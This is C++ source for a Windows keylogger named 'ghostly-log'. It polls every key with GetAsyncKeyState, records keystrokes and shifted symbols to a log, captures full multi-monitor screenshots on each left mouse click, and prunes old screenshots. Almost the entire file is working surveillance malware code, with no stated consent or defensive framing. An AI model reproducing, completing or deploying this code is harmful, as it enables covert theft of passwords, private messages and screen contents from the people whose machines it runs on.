// ghostly-log.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include "FileOutput.h"
#include "gdiplus.h"
#include "cstring"
#include <conio.h>
#include <chrono>
#include <ctime>
#include <stdio.h>
#include <time.h>
#include <Windows.h>
#include <cstdio>
#include <filesystem>

int topLeftX = -1;
int topLeftY = -1;
int botRightX = -1;
int botRightY = -1;

BOOL CALLBACK MonitorEnumProc(HMONITOR hMonitor,
	HDC      hdcMonitor,
	LPRECT   lprcMonitor,
	LPARAM   dwData)
{
	MONITORINFO info;
	info.cbSize = sizeof(info);
	if (GetMonitorInfo(hMonitor, &info))
	{
		if (topLeftX == -1 && topLeftY == -1) {
			topLeftX = info.rcMonitor.left;
			topLeftY = info.rcMonitor.top;
		}
		if (botRightX < info.rcMonitor.right) {
			botRightX = info.rcMonitor.right;
		}
		if (botRightY < info.rcMonitor.bottom) {
			botRightY = info.rcMonitor.bottom;
		}
	}
	return TRUE;  // continue enumerating
}

int main()
{
	// Set the number of days to keep pictures
	const int numDaysToKeep = 2;

	// Get the current time
	std::time_t currentTime = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());

	// Iterate through all the files in the directory
	for (const auto& entry : std::filesystem::directory_iterator("./images")) {
		// Get the modified date of the file
		const auto modifiedTime = std::filesystem::last_write_time(entry);
		const auto systemTime = std::chrono::clock_cast<std::chrono::system_clock>(modifiedTime);

		// Convert the modified time to a time_t object
		const auto modifiedTime_t = std::chrono::system_clock::to_time_t(systemTime);

		// Calculate the age of the file in days
		double ageInDays = difftime(currentTime, modifiedTime_t) / (60 * 60 * 24);

		// If the file is older than the specified number of days, delete it
		if (ageInDays > numDaysToKeep) {
			std::filesystem::remove(entry);
		}
	}

	FileOutput logger;
	std::cout << "Keylogger started!\n";
	EnumDisplayMonitors(NULL, NULL, MonitorEnumProc, 0);
	POINT a{ topLeftX, topLeftY };
	POINT b{ botRightX, botRightY };
	Gdiplus::GdiplusStartupInput gdiplusStartupInput;
	ULONG_PTR gdiplusToken;
	Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

	unsigned char c;
	for (c = 1; c <= 255; c++) {
		if ((GetKeyState(VK_LBUTTON) & 0x80) != 0)
		{
			logger.screenshot(a, b);
		}
		if ((GetKeyState(VK_RBUTTON) & 0x80) != 0)
		{
			continue;
		}

		if (GetAsyncKeyState(c) & 0x0001) {

			std::string s(1, c);

			if (((c > 64) && (c < 91)) && !(GetAsyncKeyState(0x10)))
			{
				std::string low(1, tolower(c));
				logger.log(low);
			}
			else if ((c > 64) && (c < 91))
			{
				logger.log(s);
			}
			else {

				switch (c)
				{
				case VK_SPACE: logger.log("<SPACE>"); break;
				case VK_RETURN: logger.log("<ENTER>"); break;
				case VK_TAB: logger.log("<TAB>"); break;
				case VK_ESCAPE: logger.log("<ESCAPE>"); break;
				case VK_BACK: logger.log("<BACKSPACE>"); break;
				case VK_DELETE: logger.log("<DELETE>"); break;
				case VK_RSHIFT: logger.log("<RSHIFT>"); break;
				case VK_SHIFT: logger.log("<SHIFT>"); break;
				case VK_CAPITAL: logger.log("<CAPS_LOCK>"); break;
				case VK_CONTROL: logger.log("<CONTROL>"); break;
				case VK_MENU: logger.log("<ALT>"); break;
				case VK_LWIN: logger.log("<WIN>"); break;
				case VK_RWIN: logger.log("<WIN>"); break;

				case VK_END: logger.log("<END>"); break;
				case VK_HOME: logger.log("<HOME>"); break;
				case VK_LEFT:logger.log("<LEFT>"); break;
				case VK_UP: logger.log("<UP>"); break;
				case VK_RIGHT: logger.log("<RIGHT>"); break;
				case VK_DOWN: logger.log("<DOWN>"); break;
				case VK_PRIOR: logger.log("<PAGE_UP>"); break;
				case VK_NEXT: logger.log("<PAGE_DOWN>"); break;
				case VK_INSERT: logger.log("<INSERT>"); break;

				case VK_OEM_PLUS: GetAsyncKeyState(0x10) ? logger.log("+") : logger.log("="); break;
				case VK_OEM_COMMA: GetAsyncKeyState(0x10) ? logger.log("<") : logger.log(","); break;
				case VK_OEM_MINUS: GetAsyncKeyState(0x10) ? logger.log("_") : logger.log("-"); break;
				case VK_OEM_PERIOD: GetAsyncKeyState(0x10) ? logger.log(">") : logger.log("."); break;
				case VK_OEM_1: GetAsyncKeyState(0x10) ? logger.log(":") : logger.log(";"); break;
				case VK_OEM_2: GetAsyncKeyState(0x10) ? logger.log("?") : logger.log("/"); break;
				case VK_OEM_3: GetAsyncKeyState(0x10) ? logger.log("~") : logger.log("`"); break;
				case VK_OEM_4: GetAsyncKeyState(0x10) ? logger.log("{") : logger.log("["); break;
				case VK_OEM_5: GetAsyncKeyState(0x10) ? logger.log("|") : logger.log("\\"); break;
				case VK_OEM_6: GetAsyncKeyState(0x10) ? logger.log("}") : logger.log("]"); break;
				case VK_OEM_7: GetAsyncKeyState(0x10) ? logger.log("\"") : logger.log("'"); break;

				case VK_F1: logger.log("<F1>"); break;
				case VK_F2: logger.log("<F2>"); break;
				case VK_F3: logger.log("<F3>"); break;
				case VK_F4: logger.log("<F4>"); break;
				case VK_F5: logger.log("<F5>"); break;
				case VK_F6: logger.log("<F6>"); break;
				case VK_F7: logger.log("<F7>"); break;
				case VK_F8: logger.log("<F8>"); break;
				case VK_F9: logger.log("<F9>"); break;
				case VK_F10: logger.log("<F10>"); break;
				case VK_F11: logger.log("<F11>"); break;
				case VK_F12: logger.log("<F12>"); break;

				case VK_NUMPAD0: logger.log("<NUM_0>"); break;
				case VK_NUMPAD1: logger.log("<NUM_1>"); break;
				case VK_NUMPAD2: logger.log("<NUM_2>"); break;
				case VK_NUMPAD3: logger.log("<NUM_3>"); break;
				case VK_NUMPAD4: logger.log("<NUM_4>"); break;
				case VK_NUMPAD5: logger.log("<NUM_5>"); break;
				case VK_NUMPAD6: logger.log("<NUM_6>"); break;
				case VK_NUMPAD7: logger.log("<NUM_7>"); break;
				case VK_NUMPAD8: logger.log("<NUM_8>"); break;
				case VK_NUMPAD9: logger.log("<NUM_9>"); break;


				case VK_ADD: logger.log("<NUM_ADD>"); break;
				case VK_DECIMAL: logger.log("<NUM_DECIMAL>"); break;
				case VK_DIVIDE: logger.log("<NUM_DIVIDE>"); break;
				case VK_MULTIPLY: logger.log("<NUM_MULTIPLY>"); break;
				case VK_SUBTRACT: logger.log("<NUM_SUBTRACT>"); break;
				case VK_SEPARATOR: logger.log("<NUM_SEPARATOR>"); break;


				case 48: GetAsyncKeyState(0x10) ? logger.log(")") : logger.log("0"); break;
				case 49: GetAsyncKeyState(0x10) ? logger.log("!") : logger.log("1"); break;
				case 50: GetAsyncKeyState(0x10) ? logger.log("@") : logger.log("2"); break;
				case 51: GetAsyncKeyState(0x10) ? logger.log("#") : logger.log("3"); break;
				case 52: GetAsyncKeyState(0x10) ? logger.log("$") : logger.log("4"); break;
				case 53: GetAsyncKeyState(0x10) ? logger.log("%") : logger.log("5"); break;
				case 54: GetAsyncKeyState(0x10) ? logger.log("^") : logger.log("6"); break;
				case 55: GetAsyncKeyState(0x10) ? logger.log("&") : logger.log("7"); break;
				case 56: GetAsyncKeyState(0x10) ? logger.log("*") : logger.log("8"); break;
				case 57: GetAsyncKeyState(0x10) ? logger.log("(") : logger.log("9"); break;
				}
			}
		}
	}
}
